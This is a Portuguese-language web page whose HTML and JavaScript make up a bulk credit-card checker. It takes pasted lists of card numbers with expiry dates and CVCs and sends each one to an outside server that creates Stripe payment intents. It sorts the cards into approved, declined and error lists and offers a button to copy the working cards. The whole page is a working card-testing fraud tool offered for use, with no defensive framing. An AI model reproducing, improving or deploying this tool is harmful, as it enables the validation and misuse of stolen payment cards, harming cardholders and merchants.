<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Testador de Cartões</title>
  <script src="https://js.stripe.com/v3/"></script>
  <style>
    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
      font-family: Arial, sans-serif;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1);
    }
    h1 { text-align: center; font-size: 20px; }
    .tab { display: inline-block; padding: 10px; cursor: pointer; }
    .tab.active { font-weight: bold; text-decoration: underline; }
    .tab-content { display: none; padding: 10px; }
    .show { display: block; }
    .approved { background-color: lightgreen; padding: 5px; }
    .declined { background-color: lightcoral; padding: 5px; }
    .error { background-color: orange; padding: 5px; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Testador de Cartões</h2>
    <textarea id="cardInput" placeholder="Insira os cartões no formato: 5115889690540189|03|2028|447 (um por linha)"></textarea>
    <div>
      <button id="startBtn" style="background-color:green;color:white;">Iniciar</button>
      <button id="pauseBtn" style="background-color:blue;color:white;">Pausar</button>
      <button id="stopBtn" style="background-color:red;color:white;">Parar</button>
    </div>
    <div>
      <span class="tab active" onclick="showTab('approvedTab')">Aprovados</span> | 
      <span class="tab" onclick="showTab('declinedTab')">Reprovados</span> | 
      <span class="tab" onclick="showTab('errorTab')">Erros</span>
    </div>
    <div id="approvedTab" class="tab-content show">
      <h3>Aprovados</h3>
      <button onclick="copyApproved()">Copiar Aprovados</button>
      <div id="approvedList"></div>
    </div>
    <div id="declinedTab" class="tab-content">
      <h3>Reprovados</h3>
      <div id="declinedList"></div>
    </div>
    <div id="errorTab" class="tab-content">
      <h3>Erros</h3>
      <div id="errorList"></div>
    </div>
  </div>

  <script>
    let isTesting = false, isPaused = false, cardQueue = [], interval = null;

    function startTesting() {
      if (isTesting) return;
      isTesting = true;
      isPaused = false;
      cardQueue = document.getElementById("cardInput").value.split("\n").filter(line => line.trim() !== "");
      processQueue();
    }

    function pauseTesting() { isPaused = !isPaused; }
    function stopTesting() { isTesting = false; clearInterval(interval); }

    function processQueue() {
      if (!isTesting || cardQueue.length === 0) return;

      interval = setInterval(async () => {
        if (isPaused || cardQueue.length === 0) {
          if (cardQueue.length === 0) stopTesting();
          return;
        }

        let card = cardQueue.shift();
        let [number, expMonth, expYear, cvc] = card.split("|");

        let response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cardNumber: number,
            expMonth: parseInt(expMonth),
            expYear: parseInt(expYear),
            cvc: cvc
          }),
        });

        let result = await response.json();
        handleResult(card, result, response.status);
      }, 10000);
    }

    function handleResult(card, result, status) {
      let message = `${card} - Código: ${status}`;
      if (result.success) {
        document.getElementById("approvedList").innerHTML += `<p class="approved">${message}</p>`;
      } else if (status === 402) {
        document.getElementById("declinedList").innerHTML += `<p class="declined">${message}</p>`;
      } else {
        document.getElementById("errorList").innerHTML += `<p class="error">${message}</p>`;
      }
    }

    function showTab(tabId) {
      document.querySelectorAll(".tab-content").forEach(tab => tab.classList.remove("show"));
      document.getElementById(tabId).classList.add("show");
    }

    function copyApproved() {
      let approvedText = Array.from(document.querySelectorAll("#approvedList p")).map(p => p.innerText.split(" - ")[0]).join("\n");
      navigator.clipboard.writeText(approvedText);
      alert("Cartões aprovados copiados!");
    }

    document.getElementById("startBtn").onclick = startTesting;
    document.getElementById("pauseBtn").onclick = pauseTesting;
    document.getElementById("stopBtn").onclick = stopTesting;
  </script>
</body>
</html>
